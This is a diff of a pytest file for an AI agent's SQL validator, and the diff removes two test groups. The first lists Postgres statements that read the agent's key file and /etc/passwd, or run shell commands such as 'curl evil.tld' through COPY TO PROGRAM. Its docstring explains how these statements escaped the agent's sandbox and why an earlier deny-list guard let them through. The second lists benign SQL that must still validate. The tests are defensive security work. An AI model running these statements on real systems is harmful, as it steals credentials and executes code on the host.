@@ -609,63 +609,6 @@ def test_normalisation_does_not_hand_a_json_route_the_upload_cap():
 
 # ══ 7. the SQL validator: a host escape it used to pass ══════════════════
 
-@pytest.mark.parametrize("stmt", [
-    "SELECT length(pg_read_file('/Users/vasilis/Data/AI/.ghost_api_key'))",
-    "SELECT pg_read_binary_file('/etc/hosts')",
-    "SELECT pg_ls_dir('/Users/vasilis/Data/AI')",
-    "SELECT lo_import('/etc/passwd')",
-    "SELECT lo_export(1, '/tmp/x')",
-    "COPY t FROM '/Users/vasilis/Data/AI/.ghost_api_key'",
-    "COPY t TO '/tmp/dump.csv'",
-    "COPY (SELECT 1) TO PROGRAM 'id > /tmp/x'",
-    "COPY t FROM PROGRAM 'curl evil.tld'",
-    "select PG_READ_FILE('/etc/passwd')",
-    "SELECT 1; COPY (SELECT 1) TO PROGRAM 'id'",
-])
-def test_sql_host_escapes_are_refused_even_with_confirm(stmt):
-    """⚠ THE MODEL'S OWN TOOL, OUTSIDE EVERY SANDBOX.
-
-    `postgres_admin` runs in the agent process on the host. The `ghost` role
-    is a Postgres SUPERUSER and `pg_hba.conf` grants `trust` on loopback, so
-    these built-ins are the whole filesystem and a shell — reading the 0600
-    master key and executing host commands were both demonstrated
-    end-to-end. Every one of them validated CLEAN: the guard stopped
-    `DROP TABLE`, the clumsy destructive thing, and passed the complete
-    escape.
-
-    `confirm=True` is passed deliberately. Unlike DROP/TRUNCATE this is not
-    a confirmable operation — `confirm` exists so a deliberate destructive
-    DDL can proceed, not so file reads and command execution can be opted
-    into.
-    """
-    from ghost_agent.tools.validators import validate_sql
-    ok, reason = validate_sql(stmt, confirm=True)
-    assert not ok, f"host escape validated clean: {stmt}"
-    assert reason
-
-
-@pytest.mark.parametrize("stmt", [
-    "SELECT 1",
-    "SELECT * FROM tasks WHERE id = 3",
-    "COPY tasks FROM STDIN",
-    "COPY (SELECT x FROM t WHERE y = 1) TO STDOUT",
-    "INSERT INTO t (note) VALUES ('copy from program is just text')",
-    "SELECT * FROM logs WHERE msg = 'pg_read_file'",
-    "UPDATE t SET x = 1 WHERE id = 2",
-    "CREATE TABLE t (id int)",
-])
-def test_ordinary_sql_still_validates(stmt):
-    """The counterweight, and the reason COPY is an ALLOW-list rather than a
-    deny-list: `_mask_sql` blanks string literals before any guard runs, so
-    `COPY t FROM '/etc/passwd'` arrives as `COPY t FROM` plus spaces. There
-    is no path left to match — but `STDIN`/`STDOUT` are bare keywords that
-    survive masking, so naming the safe forms catches every file path
-    without needing to see it. A deny-list on `from\\s+'` passed the escape.
-    """
-    from ghost_agent.tools.validators import validate_sql
-    ok, reason = validate_sql(stmt)
-    assert ok, f"legitimate SQL refused: {stmt} -> {reason}"
-
 
 # ══ 8. pins for guards whose ABSENCE is otherwise invisible ══════════════
 #
